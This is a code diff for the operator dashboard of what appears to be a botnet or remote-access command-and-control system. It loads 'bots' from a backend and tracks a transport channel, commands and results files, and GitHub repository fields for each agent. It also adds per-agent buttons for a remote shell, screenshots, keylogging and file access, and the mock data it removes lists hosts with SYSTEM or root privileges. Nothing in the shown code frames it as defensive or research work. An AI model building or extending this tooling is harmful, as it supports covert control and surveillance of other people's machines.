@@ -7,14 +7,17 @@ import LoadingScreen from '../components/LoadingScreen';
 import { User, parseUserFromCookie, removeCookie } from '../utils/auth';
 
 interface Agent {
-  id: string;
-  host: string;
-  country: string;
-  os: string;
-  privileges: string;
-  rtt: string;
-  lastContact: string;
-  status: 'online' | 'offline' | 'sleeping';
+  uuid: string;
+  platform: string;
+  transport_channel: string;
+  status: string;
+  created_at: string;
+  commands_file: string;
+  results_file: string;
+  github_username?: string;
+  github_repo?: string;
+  last_seen?: string;
+  capabilities?: string[];
 }
 
 export default function AgentsAndFleetPage() {
@@ -27,48 +30,8 @@ export default function AgentsAndFleetPage() {
   const router = useRouter();
 
   // Mock agent data
-  const [agents] = useState<Agent[]>([
-    {
-      id: 'ZT-001247',
-      host: 'FIN-SRV01',
-      country: 'US',
-      os: 'Windows 11',
-      privileges: 'SYSTEM',
-      rtt: '47ms',
-      lastContact: '0s ago',
-      status: 'online'
-    },
-    {
-      id: 'ZT-001248',
-      host: 'DEV-WS02',
-      country: 'UK',
-      os: 'Ubuntu 22.04',
-      privileges: 'root',
-      rtt: '89ms',
-      lastContact: '2m ago',
-      status: 'online'
-    },
-    {
-      id: 'ZT-001249',
-      host: 'MAC-PRO01',
-      country: 'DE',
-      os: 'macOS Sonoma',
-      privileges: 'admin',
-      rtt: '156ms',
-      lastContact: '5m ago',
-      status: 'sleeping'
-    },
-    {
-      id: 'ZT-001250',
-      host: 'TEST-AND01',
-      country: 'JP',
-      os: 'Android 13',
-      privileges: 'user',
-      rtt: '234ms',
-      lastContact: '1h ago',
-      status: 'offline'
-    }
-  ]);
+  const [agents, setAgents] = useState<Agent[]>([]);
+  const [loadingAgents, setLoadingAgents] = useState(false);
 
   useEffect(() => {
     // Check if user is logged in via cookies
@@ -81,6 +44,36 @@ export default function AgentsAndFleetPage() {
     setUser(userInfo);
     setLoading(false);
   }, [router]);
+
+  // Load agents from backend
+  useEffect(() => {
+    if (user) {
+      loadAgents();
+    }
+  }, [user]);
+
+  const loadAgents = async () => {
+    setLoadingAgents(true);
+    try {
+      const response = await fetch(`http://localhost:5000/bots?username=${user?.username || 'admin'}`, {
+        method: 'GET',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+      });
+
+      if (response.ok) {
+        const result = await response.json();
+        if (result.status === 'success') {
+          setAgents(result.bots || []);
+        }
+      }
+    } catch (error) {
+      console.error('Error loading agents:', error);
+    } finally {
+      setLoadingAgents(false);
+    }
+  };
 
   const handleLogout = () => {
     removeCookie('user');
@@ -95,8 +88,12 @@ export default function AgentsAndFleetPage() {
     console.log('Exporting agent list');
   };
 
-  const handleAgentAction = (agentId: string, action: string) => {
-    console.log(`Executing ${action} on agent ${agentId}`);
+  const handleAgentAction = (agentUuid: string, action: string) => {
+    console.log(`Executing ${action} on agent ${agentUuid}`);
+  };
+
+  const accessShell = (agentUuid: string) => {
+    window.open(`/shell/${agentUuid}`, '_blank');
   };
 
   const getStatusColor = (status: string) => {
@@ -113,12 +110,12 @@ export default function AgentsAndFleetPage() {
   };
 
   const filteredAgents = agents.filter(agent => {
-    const matchesSearch = agent.id.toLowerCase().includes(searchQuery.toLowerCase()) ||
-                         agent.host.toLowerCase().includes(searchQuery.toLowerCase());
+    const matchesSearch = agent.uuid.toLowerCase().includes(searchQuery.toLowerCase()) ||
+                         agent.platform.toLowerCase().includes(searchQuery.toLowerCase());
     const matchesStatus = statusFilter === 'All Status' || agent.status === statusFilter.toLowerCase();
-    const matchesCountry = countryFilter === 'All Countries' || agent.country === countryFilter;
+    const matchesPlatform = countryFilter === 'All Countries' || agent.platform === countryFilter;
     
-    return matchesSearch && matchesStatus && matchesCountry;
+    return matchesSearch && matchesStatus && matchesPlatform;
   });
 
   if (loading) {
@@ -180,17 +177,17 @@ export default function AgentsAndFleetPage() {
               <option>sleeping</option>
             </select>
 
-            {/* Country Filter */}
+            {/* Platform Filter */}
             <select
               value={countryFilter}
               onChange={(e) => setCountryFilter(e.target.value)}
               className="bg-gray-800 border border-gray-600 rounded-lg px-3 py-2 text-white font-mono text-sm focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-green-500"
             >
-              <option>All Countries</option>
-              <option>US</option>
-              <option>UK</option>
-              <option>DE</option>
-              <option>JP</option>
+              <option>All Platforms</option>
+              <option>windows</option>
+              <option>linux</option>
+              <option>macos</option>
+              <option>android</option>
             </select>
           </div>
 
@@ -220,69 +217,73 @@ export default function AgentsAndFleetPage() {
         </div>
 
         {/* Agents Display */}
-        {viewMode === 'grid' ? (
+        {loadingAgents ? (
+          <div className="text-center py-12">
+            <div className="text-gray-400 text-lg font-mono">Loading agents...</div>
+          </div>
+        ) : viewMode === 'grid' ? (
           <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6">
             {filteredAgents.map((agent) => (
-              <div key={agent.id} className="bg-gray-900 rounded-lg p-6 border border-gray-700 hover:border-green-500 transition-all duration-200">
+              <div key={agent.uuid} className="bg-gray-900 rounded-lg p-6 border border-gray-700 hover:border-green-500 transition-all duration-200">
                 {/* Agent Header */}
                 <div className="flex items-center justify-between mb-4">
-                  <h3 className="text-xl font-mono font-bold text-green-400">{agent.id}</h3>
+                  <h3 className="text-xl font-mono font-bold text-green-400">{agent.uuid}</h3>
                   <div className={`w-3 h-3 rounded-full ${getStatusColor(agent.status)}`}></div>
                 </div>
 
                 {/* Agent Details */}
                 <div className="space-y-2 mb-6">
                   <div className="flex justify-between text-sm">
-                    <span className="text-gray-400 font-mono">Host:</span>
-                    <span className="text-white font-mono">{agent.host}</span>
+                    <span className="text-gray-400 font-mono">Platform:</span>
+                    <span className="text-white font-mono capitalize">{agent.platform}</span>
                   </div>
                   <div className="flex justify-between text-sm">
-                    <span className="text-gray-400 font-mono">Country:</span>
-                    <span className="text-white font-mono">{agent.country}</span>
+                    <span className="text-gray-400 font-mono">Transport:</span>
+                    <span className="text-white font-mono capitalize">{agent.transport_channel}</span>
                   </div>
                   <div className="flex justify-between text-sm">
-                    <span className="text-gray-400 font-mono">OS:</span>
-                    <span className="text-white font-mono">{agent.os}</span>
+                    <span className="text-gray-400 font-mono">Status:</span>
+                    <span className="text-white font-mono capitalize">{agent.status}</span>
                   </div>
                   <div className="flex justify-between text-sm">
-                    <span className="text-gray-400 font-mono">Privileges:</span>
-                    <span className="text-white font-mono">{agent.privileges}</span>
+                    <span className="text-gray-400 font-mono">Created:</span>
+                    <span className="text-white font-mono">{new Date(agent.created_at).toLocaleDateString()}</span>
                   </div>
                   <div className="flex justify-between text-sm">
-                    <span className="text-gray-400 font-mono">RTT:</span>
-                    <span className="text-white font-mono">{agent.rtt}</span>
+                    <span className="text-gray-400 font-mono">Last Seen:</span>
+                    <span className="text-white font-mono">{agent.last_seen ? new Date(agent.last_seen).toLocaleString() : 'Never'}</span>
                   </div>
                   <div className="flex justify-between text-sm">
-                    <span className="text-gray-400 font-mono">Last Contact:</span>
-                    <span className="text-white font-mono">{agent.lastContact}</span>
+                    <span className="text-gray-400 font-mono">Files:</span>
+                    <span className="text-white font-mono text-xs">{agent.commands_file.split('/')[1]}</span>
                   </div>
                 </div>
 
                 {/* Action Buttons */}
                 <div className="grid grid-cols-2 gap-2">
                   <button
-                    onClick={() => handleAgentAction(agent.id, 'screenshot')}
-                    className="bg-blue-600 hover:bg-blue-700 text-white px-3 py-2 rounded font-mono text-xs transition-colors"
+                    onClick={() => accessShell(agent.uuid)}
+                    className="bg-green-600 hover:bg-green-700 text-white px-3 py-2 rounded font-mono text-xs transition-colors"
                   >
-                    Screenshot
+                    🖥️ Shell
                   </button>
                   <button
-                    onClick={() => handleAgentAction(agent.id, 'keylog')}
+                    onClick={() => handleAgentAction(agent.uuid, 'screenshot')}
                     className="bg-blue-600 hover:bg-blue-700 text-white px-3 py-2 rounded font-mono text-xs transition-colors"
                   >
-                    Keylog
+                    📸 Screenshot
                   </button>
                   <button
-                    onClick={() => handleAgentAction(agent.id, 'fileaccess')}
+                    onClick={() => handleAgentAction(agent.uuid, 'keylog')}
                     className="bg-blue-600 hover:bg-blue-700 text-white px-3 py-2 rounded font-mono text-xs transition-colors"
                   >
-                    FileAccess
+                    ⌨️ Keylog
                   </button>
                   <button
-                    onClick={() => handleAgentAction(agent.id, 'networkscan')}
+                    onClick={() => handleAgentAction(agent.uuid, 'fileaccess')}
                     className="bg-blue-600 hover:bg-blue-700 text-white px-3 py-2 rounded font-mono text-xs transition-colors"
                   >
-                    NetworkScan
+                    📁 Files
                   </button>
                 </div>
               </div>
@@ -293,22 +294,20 @@ export default function AgentsAndFleetPage() {
             <table className="w-full">
               <thead className="bg-gray-800">
                 <tr>
-                  <th className="px-6 py-3 text-left text-xs font-mono font-medium text-gray-300 uppercase tracking-wider">Agent ID</th>
+                  <th className="px-6 py-3 text-left text-xs font-mono font-medium text-gray-300 uppercase tracking-wider">Agent UUID</th>
                   <th className="px-6 py-3 text-left text-xs font-mono font-medium text-gray-300 uppercase tracking-wider">Status</th>
-                  <th className="px-6 py-3 text-left text-xs font-mono font-medium text-gray-300 uppercase tracking-wider">Host</th>
-                  <th className="px-6 py-3 text-left text-xs font-mono font-medium text-gray-300 uppercase tracking-wider">Country</th>
-                  <th className="px-6 py-3 text-left text-xs font-mono font-medium text-gray-300 uppercase tracking-wider">OS</th>
-                  <th className="px-6 py-3 text-left text-xs font-mono font-medium text-gray-300 uppercase tracking-wider">Privileges</th>
-                  <th className="px-6 py-3 text-left text-xs font-mono font-medium text-gray-300 uppercase tracking-wider">RTT</th>
-                  <th className="px-6 py-3 text-left text-xs font-mono font-medium text-gray-300 uppercase tracking-wider">Last Contact</th>
+                  <th className="px-6 py-3 text-left text-xs font-mono font-medium text-gray-300 uppercase tracking-wider">Platform</th>
+                  <th className="px-6 py-3 text-left text-xs font-mono font-medium text-gray-300 uppercase tracking-wider">Transport</th>
+                  <th className="px-6 py-3 text-left text-xs font-mono font-medium text-gray-300 uppercase tracking-wider">Created</th>
+                  <th className="px-6 py-3 text-left text-xs font-mono font-medium text-gray-300 uppercase tracking-wider">Last Seen</th>
                   <th className="px-6 py-3 text-left text-xs font-mono font-medium text-gray-300 uppercase tracking-wider">Actions</th>
                 </tr>
               </thead>
               <tbody className="divide-y divide-gray-700">
                 {filteredAgents.map((agent) => (
-                  <tr key={agent.id} className="hover:bg-gray-800">
+                  <tr key={agent.uuid} className="hover:bg-gray-800">
                     <td className="px-6 py-4 whitespace-nowrap">
-                      <span className="text-green-400 font-mono font-semibold">{agent.id}</span>
+                      <span className="text-green-400 font-mono font-semibold text-xs">{agent.uuid}</span>
                     </td>
                     <td className="px-6 py-4 whitespace-nowrap">
                       <div className="flex items-center">
@@ -316,37 +315,35 @@ export default function AgentsAndFleetPage() {
                         <span className="text-sm font-mono capitalize">{agent.status}</span>
                       </div>
                     </td>
-                    <td className="px-6 py-4 whitespace-nowrap text-sm font-mono text-white">{agent.host}</td>
-                    <td className="px-6 py-4 whitespace-nowrap text-sm font-mono text-white">{agent.country}</td>
-                    <td className="px-6 py-4 whitespace-nowrap text-sm font-mono text-white">{agent.os}</td>
-                    <td className="px-6 py-4 whitespace-nowrap text-sm font-mono text-white">{agent.privileges}</td>
-                    <td className="px-6 py-4 whitespace-nowrap text-sm font-mono text-white">{agent.rtt}</td>
-                    <td className="px-6 py-4 whitespace-nowrap text-sm font-mono text-white">{agent.lastContact}</td>
+                    <td className="px-6 py-4 whitespace-nowrap text-sm font-mono text-white capitalize">{agent.platform}</td>
+                    <td className="px-6 py-4 whitespace-nowrap text-sm font-mono text-white capitalize">{agent.transport_channel}</td>
+                    <td className="px-6 py-4 whitespace-nowrap text-sm font-mono text-white">{new Date(agent.created_at).toLocaleDateString()}</td>
+                    <td className="px-6 py-4 whitespace-nowrap text-sm font-mono text-white">{agent.last_seen ? new Date(agent.last_seen).toLocaleString() : 'Never'}</td>
                     <td className="px-6 py-4 whitespace-nowrap">
                       <div className="flex space-x-1">
                         <button
-                          onClick={() => handleAgentAction(agent.id, 'screenshot')}
-                          className="bg-blue-600 hover:bg-blue-700 text-white px-2 py-1 rounded text-xs font-mono transition-colors"
+                          onClick={() => accessShell(agent.uuid)}
+                          className="bg-green-600 hover:bg-green-700 text-white px-2 py-1 rounded text-xs font-mono transition-colors"
                         >
-                          SS
+                          🖥️
                         </button>
                         <button
-                          onClick={() => handleAgentAction(agent.id, 'keylog')}
+                          onClick={() => handleAgentAction(agent.uuid, 'screenshot')}
                           className="bg-blue-600 hover:bg-blue-700 text-white px-2 py-1 rounded text-xs font-mono transition-colors"
                         >
-                          KL
+                          📸
                         </button>
                         <button
-                          onClick={() => handleAgentAction(agent.id, 'fileaccess')}
+                          onClick={() => handleAgentAction(agent.uuid, 'keylog')}
                           className="bg-blue-600 hover:bg-blue-700 text-white px-2 py-1 rounded text-xs font-mono transition-colors"
                         >
-                          FA
+                          ⌨️
                         </button>
                         <button
-                          onClick={() => handleAgentAction(agent.id, 'networkscan')}
+                          onClick={() => handleAgentAction(agent.uuid, 'fileaccess')}
                           className="bg-blue-600 hover:bg-blue-700 text-white px-2 py-1 rounded text-xs font-mono transition-colors"
                         >
-                          NS
+                          📁
                         </button>
                       </div>
                     </td>
